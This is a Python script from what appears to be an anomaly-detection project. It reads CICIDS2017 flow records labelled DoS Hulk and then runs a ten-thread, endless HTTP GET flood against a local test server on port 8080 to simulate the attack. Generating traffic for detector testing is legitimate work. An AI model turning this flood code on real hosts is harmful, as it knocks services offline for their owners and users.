import threading
import requests
import time
import sys
import os
import glob
import pandas as pd

# List of columns to read from CSV files
COLUMNS = [
    "Destination Port", "Flow Duration", "Total Fwd Packets", "Total Backward Packets", 
    "Total Length of Fwd Packets", "Total Length of Bwd Packets", "Fwd Packet Length Max", 
    "Fwd Packet Length Min", "Fwd Packet Length Mean", "Fwd Packet Length Std", 
    "Bwd Packet Length Max", "Bwd Packet Length Min", "Bwd Packet Length Mean", 
    "Bwd Packet Length Std", "Flow Bytes/s", "Flow Packets/s", "Flow IAT Mean", 
    "Flow IAT Std", "Flow IAT Max", "Flow IAT Min", "Fwd IAT Total", "Fwd IAT Mean", 
    "Fwd IAT Std", "Fwd IAT Max", "Fwd IAT Min", "Bwd IAT Total", "Bwd IAT Mean", 
    "Bwd IAT Std", "Bwd IAT Max", "Bwd IAT Min", "Fwd PSH Flags", "Bwd PSH Flags", 
    "Fwd URG Flags", "Bwd URG Flags", "Fwd Header Length", "Bwd Header Length", 
    "Fwd Packets/s", "Bwd Packets/s", "Min Packet Length", "Max Packet Length", 
    "Packet Length Mean", "Packet Length Std", "Packet Length Variance", "FIN Flag Count", 
    "SYN Flag Count", "RST Flag Count", "PSH Flag Count", "ACK Flag Count", "URG Flag Count", 
    "CWE Flag Count", "ECE Flag Count", "Down/Up Ratio", "Average Packet Size", 
    "Avg Fwd Segment Size", "Avg Bwd Segment Size", "Fwd Header Length.1", "Fwd Avg Bytes/Bulk", 
    "Fwd Avg Packets/Bulk", "Fwd Avg Bulk Rate", "Bwd Avg Bytes/Bulk", "Bwd Avg Packets/Bulk", 
    "Bwd Avg Bulk Rate", "Subflow Fwd Packets", "Subflow Fwd Bytes", "Subflow Bwd Packets", 
    "Subflow Bwd Bytes", "Init_Win_bytes_forward", "Init_Win_bytes_backward", "act_data_pkt_fwd", 
    "min_seg_size_forward", "Active Mean", "Active Std", "Active Max", "Active Min", "Idle Mean", 
    "Idle Std", "Idle Max", "Idle Min", "Flow Bytes/s * Flow Duration", 
    "Total Length of Fwd Packets * Total Length of Bwd Packets", "Fwd Packets/s * Bwd Packets/s", 
    "Flow Duration^2", "Flow Duration^3", "Mean Packet Length", "Std Packet Length", 
    "Flow Duration / Total Fwd Packets", "Flow Duration / Total Backward Packets", 
    "Total Fwd Packets / Total Backward Packets", "Fwd Packets/s / Bwd Packets/s", 
    "Flow Bytes/s / Flow Packets/s", "Label", "Protocol"
]

DATA_FILE = r"E:/CloudAnomalyDetectionSystem/data/train/Wednesday-workingHours.pcap_ISCX.csv"

def load_dos_hulk_data(file_path):
    """
    Reads a CSV file, selects the defined columns,
    and filters rows where Label == "DoS_Hulk".
    """
    if not os.path.exists(file_path):
        print(f"File not found: {file_path}")
        return pd.DataFrame()
    
    try:
        df = pd.read_csv(file_path, usecols=COLUMNS)
        dos_df = df[df["Label"] == "DoS Hulk"]
        return dos_df
    except Exception as e:
        print(f"Error reading {file_path}: {e}")
        return pd.DataFrame()

def dos_attack(target_url="http://127.0.0.1:8080"):
    """
    Simulates a DoS Hulk attack by sending multiple HTTP GET requests.
    """
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
    }
    
    print(f"Starting DoS Hulk attack on {target_url}")
    while True:
        try:
            response = requests.get(target_url, headers=headers)
            print(f"Request sent to {target_url} - Status: {response.status_code}")
            time.sleep(0.1)  # Adjust timing for attack intensity
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {str(e)}")
        except KeyboardInterrupt:
            print("\nDoS Hulk attack stopped.")
            sys.exit(0)

def launch_attack(url, num_threads=10):
    """
    Launches multiple threads for the DoS attack.
    """
    threads = []
    for i in range(num_threads):
        thread = threading.Thread(target=dos_attack, args=(url,))
        thread.daemon = True
        threads.append(thread)
        thread.start()
        print(f"Attack thread {i+1} started")
    
    try:
        # Keep the main thread alive.
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nStopping all attack threads...")
        sys.exit(0)

if __name__ == "__main__":
    # Load and filter data for DoS_Hulk records
    dos_data = load_dos_hulk_data(DATA_FILE)
    if dos_data.empty:
        print("No records labeled 'DoS_Hulk' found in the provided CSV file.")
    else:
        print(f"Total DoS_Hulk records found: {len(dos_data)}")
    
    # Set target URL with fixed port 8080
    target_url = "http://127.0.0.1:8080"
    launch_attack(target_url, num_threads=10)
